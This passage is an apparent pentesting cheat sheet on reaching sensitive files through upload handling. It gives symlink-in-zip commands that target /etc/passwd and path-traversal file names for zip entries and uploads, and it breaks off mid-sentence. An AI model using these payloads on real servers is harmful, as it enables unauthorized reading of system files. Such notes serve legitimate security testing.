# RCE

RCE can be obtained from XXE, LFI, SSRF

### Symlink
For functionalities where it takes a zip file and unzips after that followed by it shows the unzipped result.
Try this when it `.zip` `.apk` `.jar` 

`ln -s /etc/passwd <created_sinlink_name>` 
`zip --symlinks <zip_file_name> <created_sinlink_name>`

```
ln -s /etc/passwd symlink
```

```
zip --symlinks <zip_file_name> symlink
```

#### Path Traversal in zip
If the server unzips our file and shows to us, we can open our file with hex editor. 
modify the file name from `file.jpg`  to `../../../../../../etc/passwd`.

Now instead of our file the server will parse the internal files and shows to us.

#### Path Traversal in file upload
If we are uploading a file change the file name to `../../../../../abc.jpg`.
With this we can 